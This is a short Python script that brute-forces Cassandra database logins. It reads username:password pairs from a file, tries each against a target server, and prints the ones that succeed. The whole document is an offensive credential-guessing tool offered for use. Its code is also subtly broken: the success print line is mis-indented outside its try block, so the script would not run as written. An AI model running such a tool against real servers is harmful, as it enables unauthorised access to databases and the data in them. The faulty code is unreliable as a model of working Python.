#!/usr/bin/env python
#
# Bruteforce Cassandra plaintext authentication.
#
# You must provide a server IP or name and a credential file. The credential
# file should have one pair of credentials on each line and each credential
# pair should be in the form of username:password.
#
#
# You will need to install the cassandra driver with pip.
# sudo pip install cassandra-driver
#

import sys
from cassandra.cluster import Cluster
from cassandra.cluster import NoHostAvailable
from cassandra.auth import PlainTextAuthProvider


def authenticate(server, username, password):
    try:
        auth_provider = PlainTextAuthProvider(
            username=username, password=password)
        cluster = Cluster([server], auth_provider=auth_provider)
        session = cluster.connect()
    print("Success: {0}-{1}".format(username, password))

    except NoHostAvailable:
        pass
        # print("Fail: {0}-{1}".format(username, password))


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: cassbrute.py server credential_file")
        sys.exit()

    try:
        with open(sys.argv[2]) as f:
            for line in f:
                line = line.rstrip('\r\n')
                usr, pwd = line.split(':')
                authenticate(sys.argv[1], usr, pwd)

    except IOError as e:
        print(e)

    except ValueError as e:
        print(e)
